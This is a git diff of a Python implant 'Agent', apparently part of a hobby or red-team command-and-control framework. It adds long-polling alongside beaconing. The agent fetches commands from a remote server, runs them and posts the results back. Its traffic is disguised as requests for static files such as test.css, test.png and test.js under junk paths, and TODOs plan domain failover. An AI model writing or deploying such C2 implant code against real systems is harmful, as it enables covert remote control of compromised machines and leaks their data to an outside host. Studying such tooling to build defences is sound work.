@@ -1,5 +1,6 @@
 # NOTE: This is a newer agent file to handle more advanced beacon and session communication
 # At some point the agent_html.py will be reintegrated in some form here
+from os import error
 from sys import stderr
 import time
 import random
@@ -18,6 +19,8 @@ from typing import List
 
 
 # TODO: Make it such that the agent sends using a protobuf, rather than a json, using json for now as honestly it is just easier. I ain't trying to be an attacker
+# TODO: Make it so that there is a timer or handler to swtich to an alternate domain if this domain is not response
+# TODO: Make it such that a command list can specify whether or not a response should be sent back!
 class Agent:
     def __init__(
         self,
@@ -63,11 +66,13 @@ class Agent:
             - False if the chain of sending the command was not sucessful
         """
 
+        if not self.is_beacon():
+            raise ValueError("Beacon command called on an agent set to long poll")
+
         # The agent checks in to see if commands are available
         commands = self._check_in()
         if commands:
             results = self._execute_commands(commands)
-            print(f"THESE ARE THE RESULTS {results}")
             return self._beacon_back(commands, results)
         else:
             # Means that no commands were recieved (or there was a connection erorr and we sleep)
@@ -82,6 +87,9 @@ class Agent:
             True - Results were successfully sent back
             False - Results were not sucessfully sent back"""
 
+        if not self.is_beacon():
+            raise ValueError("Beacon command called on an agent set to long poll")
+
         self.session = requests.Session()
 
         try:
@@ -90,7 +98,7 @@ class Agent:
 
             request = self.session.post(
                 f"http://{self.activeDomain}/fjioawejfoew/jfioewajfo/test.css",
-                json=payload
+                json=payload,
             )
 
             # Check for any failed connections or attempts
@@ -115,6 +123,8 @@ class Agent:
     def _check_in(self) -> List[str] | None:
         """Obtains any available commands if there are any, if no commands are available it fails"""
 
+        if not self.is_beacon():
+            raise ValueError("Beacon command called on an agent set to long poll")
         # Generate a session
         self.session = requests.Session()
 
@@ -131,6 +141,84 @@ class Agent:
             response = request.json()
             return response["commands"]
 
+        except requests.exceptions.Timeout:
+            print("Request timed out")
+        except requests.exceptions.ConnectionError:
+            print("Connection error occurred")
+        except requests.exceptions.HTTPError as e:
+            print(f"HTTP error: {e}")
+            # Here might be where the watchdog_timer and itnerval timer setting is set up
+        except requests.exceptions.RequestException as e:
+            print(f"Request failed: {e}")
+        except Exception as e:
+            print(f"Unexpecd error: {e}")
+
+        return None
+
+    def execute_poll_sequence(self):
+        """
+        Function to be called to repeatedly poll the agent, this should be in a while loop of sorts
+        """
+
+        if self.is_beacon():
+            raise ValueError("Long Polling command called on beacon agent")
+
+        # Establish a long polling session
+        self.session = requests.Session()
+
+        commands = self._long_poll()
+        if commands:
+            results = self._execute_commands(commands)
+            self._long_poll_back(commands, results)
+            return True
+        else:
+            return False
+
+    def _long_poll(self):
+        # long poll url
+        if self.is_beacon():
+            raise ValueError("Long Polling command called on beacon agent")
+        if not self.session:
+            raise ValueError("No session is being passed for long polling")
+
+        long_poll_request_url = f"http://{self.activeDomain}/foew/fjewoj/test.png"
+        try:
+            request = self.session.get(url=long_poll_request_url)
+            request.raise_for_status()
+
+            response = request.json()
+            return response["commands"]
+
+        except requests.exceptions.Timeout:
+            print("Request timed out")
+        except requests.exceptions.ConnectionError:
+            print("Connection error occurred")
+        except requests.exceptions.HTTPError as e:
+            print(f"HTTP error: {e}")
+            # Here might be where the watchdog_timer and itnerval timer setting is set up
+        except requests.exceptions.RequestException as e:
+            print(f"Request failed: {e}")
+        except Exception as e:
+            print(f"Unexpecd error: {e}")
+
+        return None
+
+    def _long_poll_back(self, commands, results):
+        if self.is_beacon():
+            raise ValueError("Long Polling command called on beacon agent")
+
+        if self.is_beacon():
+            raise ValueError("Long Polling command called on beacon agent")
+        if not self.session:
+            raise ValueError("No session is being passed for long polling")
+
+        long_poll_results_url = f"http://{self.activeDomain}/foew/fjewoj/test.js"
+        try:
+            payload = {"commands": commands, "results": results}
+            request = self.session.post(url=long_poll_results_url, json=payload)
+            request.raise_for_status()
+
+            return True
         except requests.exceptions.Timeout:
             print("Request timed out")
         except requests.exceptions.ConnectionError:
@@ -204,8 +292,10 @@ class Agent:
         self.mode = "b"
         return
 
-    def _set_session(self):
-        self.mode = "s"
+    def _set_long_poll(self):
+        self.mode = "l"
+        # Set a session for the longpolling
+        self.session = requests.Session()
         return
 
 
